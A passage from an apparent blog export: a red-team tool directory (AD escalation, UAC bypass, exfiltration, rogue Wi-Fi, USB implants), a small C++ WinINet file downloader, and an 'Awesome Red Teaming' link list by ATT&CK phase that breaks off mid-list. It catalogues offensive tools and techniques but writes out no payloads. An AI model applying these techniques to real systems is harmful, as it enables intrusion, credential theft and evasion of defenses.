DAMP The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.https://github.com/HarmJ0y/DAMP Escalate PrivilegesDomain Escalation PowerView is a PowerShell tool to gain network situational awareness on Windows domains. https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 Get-GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Invoke-ACLpwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. https://github.com/fox-it/Invoke-ACLPwn BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. https://github.com/BloodHoundAD/BloodHound PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek Grouper a PowerShell script for helping to find vulnerable settings in AD Group Policy.https://github.com/l0ss/Grouper ADRecon is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. https://github.com/sense-of-security/ADRecon ADACLScanner one script for ACL’s in Active Directory. https://github.com/canix1/ADACLScanner LAPSToolkit a tool to audit and attack LAPS environments. https://github.com/leoloobeek/LAPSToolkit PingCastle is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. https://www.pingcastle.com/download RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). https://github.com/cyberark/RiskySPN Mystique is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. https://github.com/machosec/Mystique Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy’s Kekeo project. https://github.com/GhostPack/Rubeus kekeo is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). https://github.com/gentilkiwi/kekeo Local Escalation UACMe is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. https://github.com/hfiref0x/UACME windows-kernel-exploits a collection windows kernel exploit. https://github.com/SecWiki/windows-kernel-exploits PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload. https://github.com/rsmudge/ElevateKit Sherlock a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. https://github.com/rasta-mouse/Sherlock Tokenvator a tool to elevate privilege with Windows Tokens. https://github.com/0xbadjuju/Tokenvator Data Exfiltration CloakifyFactory &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. https://github.com/TryCatchHCF/Cloakify DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. https://github.com/sensepost/DET DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. https://github.com/Arno0x/DNSExfiltrator PyExfil a Python Package for Data Exfiltration. https://github.com/ytisf/PyExfil Egress-Assess is a tool used to test egress data detection capabilities. https://github.com/ChrisTruncer/Egress-Assess Powershell RAT python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. https://github.com/Viralmaniar/Powershell-RAT MiscWireless Networks Wifiphisher is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. https://github.com/wifiphisher/wifiphisher Evilginx is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. https://github.com/kgretzky/evilginx mana toolkit for wifi rogue AP attacks and MitM. https://github.com/sensepost/mana Embedded &amp; Peripheral Devices Hacking magspoof a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card “wirelessly”, even on standard magstripe (non-NFC/RFID) readers. https://github.com/samyk/magspoof WarBerryPi was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. https://github.com/secgroundzero/warberry P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). https://github.com/mame82/P4wnP1 malusb HID spoofing multi-OS payload for Teensy. https://github.com/ebursztein/malusb Fenrir is a tool designed to be used “out-of-the-box” for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. https://github.com/Orange-Cyberdefense/fenrir-ocd poisontap exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. https://github.com/samyk/poisontap WHID WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.https://github.com/whid-injector/WHID Software For Team Communication RocketChat is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. https://rocket.chat Etherpad is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document https://etherpad.net Log Aggregation RedELK Red Team’s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. https://github.com/outflanknl/RedELK/ CobaltSplunk Splunk Dashboard for CobaltStrike logs. https://github.com/vysec/CobaltSplunk Red Team Telemetry A collection of scripts and configurations to enable centralized logging of red team infrastructure. https://github.com/ztgrace/red_team_telemetry Elastic for Red Teaming Repository of resources for configuring a Red Team SIEM using Elastic. https://github.com/SecurityRiskAdvisors/RedTeamSIEM C# Offensive Framework SharpSploit is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. https://github.com/cobbr/SharpSploit GhostPack is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. https://github.com/GhostPack SharpWeb .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. https://github.com/djhohnstein/SharpWeb reconerator C# Targeted Attack Reconnissance Tools. https://github.com/stufus/reconerator SharpView C# implementation of harmj0y’s PowerView. https://github.com/tevora-threat/SharpView Watson is a (.NET 2.0 compliant) C# implementation of Sherlock. https://github.com/rasta-mouse/Watson Labs Detection Lab This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. https://github.com/clong/DetectionLab Modern Windows Attacks and Defense Lab This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. https://github.com/jaredhaight/WindowsAttackAndDefenseLab Invoke-UserSimulator Simulates common user behaviour on local and remote Windows hosts. https://github.com/ubeeri/Invoke-UserSimulator Invoke-ADLabDeployer Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. https://github.com/outflanknl/Invoke-ADLabDeployer Sheepl Creating realistic user behaviour for supporting tradecraft development within lab environments. https://github.com/SpiderLabs/sheepl Scripts Aggressor Scripts is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots. https://github.com/invokethreatguy/CSASC https://github.com/secgroundzero/CS-Aggressor-Scripts https://github.com/Und3rf10w/Aggressor-scripts https://github.com/harleyQu1nn/AggressorScripts https://github.com/rasta-mouse/Aggressor-Script https://github.com/RhinoSecurityLabs/Aggressor-Scripts https://github.com/bluscreenofjeff/AggressorScripts https://github.com/001SPARTaN/aggressor_scripts https://github.com/360-A-Team/CobaltStrike-Toolset A collection scripts useful for red teaming and pentesting https://github.com/FuzzySecurity/PowerShell-Suite https://github.com/nettitude/Powershell https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts https://github.com/threatexpress/red-team-scripts https://github.com/SadProcessor/SomeStuff https://github.com/rvrsh3ll/Misc-Powershell-Scripts https://github.com/enigma0x3/Misc-PowerShell-Stuff https://github.com/ChrisTruncer/PenTestScripts https://github.com/bluscreenofjeff/Scripts https://github.com/xorrior/RandomPS-Scripts https://github.com/xorrior/Random-CSharpTools https://github.com/leechristensen/Random https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering References MITRE’s ATT&amp;CK™ is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s lifecycle and the platforms they are known to target. https://attack.mitre.org/wiki/Main_Page Cheat Sheets for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). https://github.com/HarmJ0y/CheatSheets PRE-ATT&amp;CK Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. https://attack.mitre.org/pre-attack/index.php/Main_Page Adversary OPSEC consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC Adversary Emulation Plans To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. https://attack.mitre.org/wiki/Adversary_Emulation_Plans Red-Team-Infrastructure-Wiki Wiki to collect Red Team infrastructure hardening resources. https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Advanced Threat Tactics – Course and Notes This is a course on red team operations and adversary simulations. https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes Red Team Tips as posted by @vysecurity on Twitter. https://vincentyiu.co.uk/red-team-tips Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources. https://github.com/yeyintminthuhtut/Awesome-Red-Teaming ATT&amp;CK for Enterprise Software is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. https://attack.mitre.org/wiki/Software Planning a Red Team exercise This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. https://github.com/magoo/redteam-plan Awesome Lockpicking a curated list of awesome guides, tools, and other resources related to the security and compromise of locks, safes, and keys. https://github.com/meitar/awesome-lockpicking Awesome Threat Intelligence a curated list of awesome Threat Intelligence resources. https://github.com/hslatman/awesome-threat-intelligence APT Notes Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. https://github.com/aptnotes/data TIBER-EU FRAMEWORK The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf CBEST Implementation Guide CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or “Red Teaming” Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf License]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wininet_downloader_cpp]]></title>
    <url>%2F2019%2F02%2F28%2Fwininet_downloader_cpp.html</url>
    <content type="text"><![CDATA[wininet.lib cpp 下载include &lt;windows.h&gt;#include &lt;wininet.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std; #pragma comment(lib, "wininet.lib") #define DOWNHELPER_AGENTNAME "downloader"#define LEN_OF_BUFFER_FOR_QUERYINFO 128#define DOWNLOAD_BUF_SIZE (10*1024) #define MAX_DOWNLOAD_REQUEST_TIME 10 #define MAX_DOWNLOAD_BYTESIZE (10000*1024*1024) BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes); BOOL DownloadUrl(std::string strUrl, std::string strFileName)&#123; BOOL bRet = FALSE; if (strUrl == "" || strFileName == "") return FALSE; HINTERNET hInet = NULL; HINTERNET hConnect = NULL; HINTERNET hRequestHead = NULL; HINTERNET hRequestGet = NULL; HANDLE hFileWrite = NULL; char* pBuf = NULL; DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME; DWORD dwDownBytes = 0; DWORD dwDownFileTotalBytes = 0; DWORD dwWriteBytes = 0; char bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;0&#125;; DWORD dwBufQueryInfoSize = sizeof(bufQueryInfo); DWORD dwStatusCode = 0; DWORD dwContentLen = 0; DWORD dwSizeDW = sizeof(DWORD); CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;0&#125;; CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;0&#125;; CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;0&#125;; CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; URL_COMPONENTSA urlComponents = &#123;0&#125;; urlComponents.dwStructSize = sizeof(URL_COMPONENTSA); urlComponents.lpszHostName = pszHostName; urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH; urlComponents.lpszUserName = pszUserName; urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH; urlComponents.lpszPassword = pszPassword; urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH; urlComponents.lpszUrlPath = pszURLPath; urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH; bRet = InternetCrackUrlA(strUrl.c_str(), 0, NULL, &amp;urlComponents); bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); if (!hInet) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, 0, NULL); if (!hConnect) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; if (urlComponents.dwUrlPathLength != 0) strcpy(szURL, urlComponents.lpszUrlPath); else strcpy(szURL, "/"); hRequestHead = HttpOpenRequestA(hConnect, "HEAD", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; dwContentLen = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, NULL); if (bRet) &#123; if (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; &#125; hRequestGet = HttpOpenRequestA(hConnect, "GET", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFileWrite) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; pBuf = new char[DOWNLOAD_BUF_SIZE]; if (!pBuf) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; dwDownFileTotalBytes = 0; while (1) &#123; dwDownBytes = 0; memset(pBuf, 0, DOWNLOAD_BUF_SIZE*sizeof(char)); bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes); if (bRet) &#123; if (dwDownBytes &gt; 0) &#123; dwDownFileTotalBytes += dwDownBytes; bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, NULL); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; &#125; else if (0 == dwDownBytes) &#123; bRet = TRUE; break; &#125; &#125; &#125; _END_OF_DOWNLOADURL: if (INVALID_HANDLE_VALUE != hFileWrite) CloseHandle(hFileWrite); if (pBuf) delete [] pBuf; if (hRequestGet) InternetCloseHandle(hRequestGet); if (hRequestHead) InternetCloseHandle(hRequestHead); if (hConnect) InternetCloseHandle(hConnect); if (hInet) InternetCloseHandle(hInet); return bRet;&#125; BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes)&#123; BOOL bRet = FALSE; DWORD dwStatusCode = 0; DWORD dwSizeDW = sizeof(DWORD); while (hRequest &amp;&amp; (nMaxTryTimes-- &gt; 0)) &#123; bRet = HttpSendRequestA(hRequest, NULL, 0, NULL, 0); if (!bRet) &#123; continue; &#125; else &#123; dwStatusCode = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, NULL); if (bRet) &#123; if (HTTP_STATUS_OK == dwStatusCode) &#123; break; &#125; else &#123; bRet = FALSE; continue; &#125; &#125; &#125; &#125; return bRet;&#125; int main(int argc, char* argv[])&#123; cout&lt;&lt; "pls input downloadurl:"; char str[80]; cin.get(str,80); BOOL bR = DownloadUrl(str, "temp.png"); cout &lt;&lt; "Downloading..."&lt;&lt;endl; if (bR) cout &lt;&lt; "ok" &lt;&lt; endl; else cout &lt;&lt; "no" &lt;&lt; endl; return 0;&#125;]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Red Teaming Tools]]></title>
    <url>%2F2019%2F02%2F28%2FAwesome%20Red%20Teaming.html</url>
    <content type="text"><![CDATA[Awesome Red TeamingList of Awesome Red Team / Red Teaming Resources This list is for anyone wishing to learn about Red Teaming but do not have a starting point. Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;CK You can help by sending Pull Requests to add more information. Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification ↑ Initial Access How To: Empire’s Cross Platform Office Macro Phishing with PowerPoint PHISHING WITH EMPIRE Bash Bunny OWASP Presentation of Social Engineering - OWASP USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23 Cobalt Strike - Spear Phishing documentation Cobalt Strike Blog - What’s the go-to phishing technique or exploit? Spear phishing with Cobalt Strike - Raphael Mudge EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE Phishing for access Excel macros with PowerShell PowerPoint and Custom Actions Macro-less Code Exec in MSWord Multi-Platform Macro Phishing Payloads Abusing Microsoft Word Features for Phishing: “subDoc” Phishing Against Protected View POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS The PlugBot: Hardware Botnet Research Project Luckystrike: An Evil Office Document Generator The Absurdly Underestimated Dangers of CSV Injection Macroless DOC malware that avoids detection with Yara rule Phishing between the app whitelists Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2) Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2) Social Engineer Portal 7 Best social Engineering attack Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012 USING THE DDE ATTACK WITH POWERSHELL EMPIRE Phishing on Twitter - POT Microsoft Office – NTLM Hashes via Frameset Defense-In-Depth write-up Spear Phishing 101 ↑ Execution Research on CMSTP.exe, Windows oneliners to download remote payload and execute arbitrary code Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts WSH Injection: A Case Study Gscript Dropper ↑ Persistence A View of Persistence hiding registry keys with psreflect Persistence using RunOnceEx – Hidden from Autoruns.exe Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe Putting data in Alternate data streams and how to execute it – part 2 WMI Persistence with Cobalt Strike Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2) Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction ↑ Privilege EscalationUser Account Control Bypass First entry: Welcome and fileless UAC bypass, Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, Reading Your Way Around UAC in 3 parts: Part 1. Part 2. Part 3. Bypassing UAC using App Paths, “Fileless” UAC Bypass using sdclt.exe, UAC Bypass or story about three escalations, “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking, Bypassing UAC on Windows 10 using Disk Cleanup, Using IARPUninstallStringLauncher COM interface to bypass UAC, Fileless UAC Bypass using sdclt Eventvwr File-less UAC Bypass CNA Windows 7 UAC whitelist Escalation Windows Privilege Escalation Checklist From Patch Tuesday to DA A Path for Privilege Escalation ↑ Defense Evasion Window 10 Device Guard Bypass App Locker ByPass List Window Signed Binary Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files) Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations Empire without powershell Powershell without Powershell to bypass app whitelist MS Signed mimikatz in just 3 steps Hiding your process from sysinternals code signing certificate cloning attacks and defenses userland api monitoring and code injection detection In memory evasion Bypassing AMSI via COM Server Hijacking process doppelganging Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5 VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION Putting data in Alternate data streams and how to execute it AppLocker – Case study – How insecure is it really? – Part 1 AppLocker – Case study – How insecure is it really? – Part 2 Harden Windows with AppLocker – based on Case study part 2 Harden Windows with AppLocker – based on Case study part 2 Office 365 Safe links bypass Windows Defender Attack Surface Reduction Rules bypass Bypassing Device guard UMCI using CHM – CVE-2017-8625 Bypassing Application Whitelisting with BGInfo Cloning and Hosting Evil Captive Portals using a Wifi PineApple https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/ Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts mavinject.exe Functionality Deconstructed ↑ Credential Access Windows Access Tokens and Alternate credentials Bringing the hashes home with reGeorg &amp; Empire Intercepting passwords with Empire and winning Local Administrator Password Solution (LAPS) Part 1 Local Administrator Password Solution (LAPS) Part 2 USING A SCF FILE TO GATHER HASHES Remote Hash Extraction On Demand Via Host Security Descriptor Modification Offensive Encrypted Data Storage Practical guide to NTLM Relaying Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync Dumping Domain Password Hashes ↑ Discovery Red Team Operating in a Modern Environment My First Go with BloodHound Introducing BloodHound A Red Teamer’s Guide to GPOs and OUs Automated Derivative Administrator Search A Pentester’s Guide to Group Scoping Local Group Enumeration The PowerView PowerUsage Series #1 - Mass User Profile Enumeration The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain The PowerView PowerUsage Series #4 – Finding cross-trust ACEs Aggressor PowerView Lay of the Land with BloodHound Scanning for Active Directory Privileges &amp; Privileged Accounts Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation SPN Discovery ↑ Lateral Movement A Citrx Story Jumping Network Segregation with RDP Pass hash pass ticket no pain Abusing DNSAdmins privilege for escalation in Active Directory Using SQL Server for attacking a Forest Trust Extending BloodHound for Red Teamers OPSEC Considerations for beacon commands My First Go with BloodHound Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws Lateral movement using excel application and dcom Lay of the Land with BloodHound The Most Dangerous User Right You (Probably) Have Never Heard Of Agentless Post Exploitation A Guide to Attacking Domain Trusts Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy Targeted Kerberoasting Kerberoasting Without Mimikatz Abusing GPO Permissions Abusing Active Directory Permissions with PowerView Roasting AS-REPs Getting the goods with CrackMapExec: Part 1 Getting the goods with CrackMapExec: Part 2 DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement a guide to attacking domain trusts Outlook Home Page – Another Ruler Vector Outlook Forms and Shells Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32 LethalHTA - A new lateral movement technique using DCOM and HTA Abusing DCOM For Yet Another Lateral Movement Technique ↑ Collection Accessing clipboard from the lock screen in Windows 10 Part 1 Accessing clipboard from the lock screen in Windows 10 Part 2 ↑ Exfiltration DNS Data exfiltration — What is this and How to use? DNS Tunnelling sg1: swiss army knife for data encryption, exfiltration &amp; covert communication Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator DET (extensible) Data Exfiltration Toolkit Data Exfiltration via Formula Injection Part1 ↑ Command and ControlDomain Fronting Empre Domain Fronting Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten Finding Frontable Domain TOR Fronting – Utilising Hidden Services for Privacy Simple domain fronting PoC with GAE C2 server Domain Fronting Via Cloudfront Alternate Domains Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate) Google Groups: Blog post on finding 2000+ Azure domains using Censys Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike SSL Domain Fronting 101 How I Identified 93k Domain-Frontable CloudFront Domains Validated CloudFront SSL Domains CloudFront Hijacking CloudFrunt GitHub Repo Connection Proxy Redirecting Cobalt Strike DNS Beacons Apache2Mod Rewrite Setup Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite High-reputation Redirectors and Domain Fronting Cloud-based Redirectors for Distributed Hacking Combatting Incident Responders with Apache mod_rewrite Operating System Based Redirection with Apache mod_rewrite Invalid URI Redirection with Apache mod_rewrite Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection mod_rewrite rule to evade vendor sandboxes Expire Phishing Links with Apache RewriteMap Serving random payloads with NGINX Mod_Rewrite Automatic Setup Hybrid Cobalt Strike Redirectors Expand Your Horizon Red Team – Modern SAAS C2 RTOps: Automating Redirector Deployment With Ansible Web Services C2 with Dropbox C2 with gmail C2 with twitter Office 365 for Cobalt Strike C2 Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike A stealthy Python based Windows backdoor that uses Github as a C&amp;C server External C2 (Third-Party Command and Control) Cobalt Strike over external C2 – beacon home in the most obscure ways External C2 for Cobalt Strike External C2 framework for Cobalt Strike External C2 framework - GitHub Repo Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs Exploring Cobalt Strike’s ExternalC2 framework Application Layer Protocol C2 WebSocket C2 WMI C2 Website C2 Image C2 Javascript C2 WebInterface C2 with DNS C2 with https C2 with webdav Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool InternetExplorer.Application for C2 Infrastructure Automated Red Team Infrastructure Deployment with Terraform - Part 1 Automated Red Team Infrastructure Deployment with Terraform - Part 2 Red Team Infrastructure - AWS Encrypted EBS 6 RED TEAM INFRASTRUCTURE TIPS How to Build a C2 Infrastructure with Digital Ocean – Part 1 Infrastructure for Ongoing Red Team Operations Attack Infrastructure Log Aggregation and Monitoring Randomized Malleable C2 Profiles Made Easy Migrating Your infrastructure ICMP C2 Using WebDAV features as a covert channel Safe Red Team Infrastructure EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT Command and Control Using Active Directory A Vision for Distributed Red Team Operations Designing Effective Covert Red Team Attack Infrastructure Serving Random Payloads with Apache mod_rewrite Mail Servers Made Easy Securing your Empire C2 with Apache mod_rewrite Automating Gophish Releases With Ansible and Docker How to Write Malleable C2 Profiles for Cobalt Strike How to Make Communication Profiles for Empire A Brave New World: Malleable C2 Malleable Command and Control ↑ Embedded and Peripheral Devices Hacking Gettting in with the Proxmark3 &amp; ProxBrute Practical Guide to RFID Badge copying Contents of a Physical Pentester Backpack MagSpoof - credit card/magstripe spoofer Wireless Keyboard Sniffer RFID Hacking with The Proxmark 3 Swiss Army Knife for RFID Exploring NFC Attack Surface Outsmarting smartcards Reverse engineering HID iClass Master keys Android Open Pwn Project (AOPP) ↑ Misc Red Tips of Vysec Cobalt Strike Tips for 2016 ccde red teams Models for Red Team Operations Planning a Red Team exercise Raphael Mudge - Dirty Red Team tricks introducing the adversary resilience methodology part 1 introducing the adversary resilience methodology part 2 Responsible red team Red Teaming for Pacific Rim CCDC 2017 How I Prepared to Red Team at PRCCDC 2015 Red Teaming for Pacific Rim CCDC 2016 Responsible Red Teams ↑ RedTeam GadgetsNetwork Implants LAN Tap Pro LAN Turtle Bash Bunny Packet SquirrelWifi Auditing WiFi Pineapple Alpha Long range Wireless USB Wifi-Deauth Monster Crazy PAIoT BLE Key Proxmark3 Zigbee Sniffer Attify IoT Exploit kitSoftware Defined Radio - SDR HackRF One Bundle RTL-SDR YARD stick one Bundle UbertoothMisc Key Grabber Magspoof Poison tap keysweeper USB Rubber Ducky ↑ Ebooks Next Generation Red Teaming Targeted Cyber Attack 